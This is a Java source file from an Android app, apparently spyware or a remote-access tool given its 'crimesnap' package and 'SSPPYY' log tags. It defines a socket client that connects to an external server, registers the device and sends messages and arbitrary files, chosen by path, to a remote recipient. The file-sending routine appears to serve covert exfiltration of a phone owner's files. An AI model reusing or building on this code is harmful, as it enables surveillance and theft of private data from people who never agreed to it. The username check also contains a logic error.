package com.crimesnap.provider;

import android.util.Log;

import com.crimesnap.provider.MyPreferences;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Objects;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class SocketManager {
    private static SocketManager instance;
    private Socket socket;

    public static String SOCKET_USER = null;

    public static final String EVENT_RECEIVE_MESSAGE = "receiveMessage";
    public static final String EVENT_SEND_MESSAGE = "sendMessage";

    public static final String EVENT_SEND_REP = "sendRep";

    public static final String EVENT_SEND_IMAGE = "sendImage";

    public static final String EVENT_DECLARE_RECIPIENT = "declareRecipient";

    private SocketManager() {

        try {
//            MyPreferences.init(HelperClass.universalContext);

            String User = "User_" + (int) (Math.random() * 1000) + 314;

            if(!Objects.isNull(MyPreferences.getUsername()) || !MyPreferences.getUsername().isEmpty()) {
                SOCKET_USER = MyPreferences.getUsername();
            } else {
                SOCKET_USER = User;
                MyPreferences.saveUsername(SOCKET_USER);
            }

            socket = IO.socket("https://omniws.onrender.com");
            socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                   declareRecipient(SocketManager.SOCKET_USER);
                }
            }).on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    // Handle disconnection
                }
            });
            socket.connect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static SocketManager getInstance() {
        if (instance == null) {
            instance = new SocketManager();
        }
        Log.d("Listener_SSPPYY : Conn" , "Connection to Socket");
        return instance;
    }

    public Socket getSocket() {
        return socket;
    }

    public void declareRecipient(String clientId) {
        JSONObject data = new JSONObject();

//        new LogData("Socket Connection Established");

        try {

            data.put("clientId", clientId);
            socket.emit(SocketManager.EVENT_DECLARE_RECIPIENT, data.toString() );
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void repeatedMessage(String clientId, JSONObject message, Socket socket) {
        JSONObject data = new JSONObject();
        try {
            data.put("clientId",SocketManager.SOCKET_USER);
            data.put("rid", clientId);
            data.put("message", message);

            if (socket == null) {
                Log.d("Listener_SSPPYY : SocketMan Error", "Socket is null");
                return;
            }

            socket.emit(EVENT_SEND_MESSAGE, data.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void sendFile(String rid, String filePath, Socket socket) {
        File file = new File(filePath);
        try {
            JSONObject data = new JSONObject();
            JSONObject message = new JSONObject();
            message.put("action" , "file");
            message.put("fileName", file.getName());
            message.put("fileSize", file.length());
            message.put("filePath", file.getAbsolutePath());
            data.put("clientId", SocketManager.SOCKET_USER);
            data.put("rid", rid);
            data.put("success" , true);
            data.put("message", "File Receiving...");
            data.put("file", message);
            FileInputStream fileInputStream = new FileInputStream(file);

            if (socket == null) {
                Log.d("Listener_SSPPYY : SocketMan Error", "Socket is null");
                return;
            }

            socket.emit("sendFile", fileInputStream, data);
        } catch (IOException | JSONException e) {
            e.printStackTrace();
        }
    }

    public static void sendMessage(String clientId, JSONObject message, Socket socket) {
        JSONObject data = new JSONObject();
        try {
            data.put("clientId",SocketManager.SOCKET_USER);
            data.put("rid", clientId);
            data.put("message", message);
            if (socket == null) {
                Log.d("Listener_SSPPYY : SocketMan Error", "Socket is null");
                return;
            }

            socket.emit(EVENT_SEND_MESSAGE, data.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}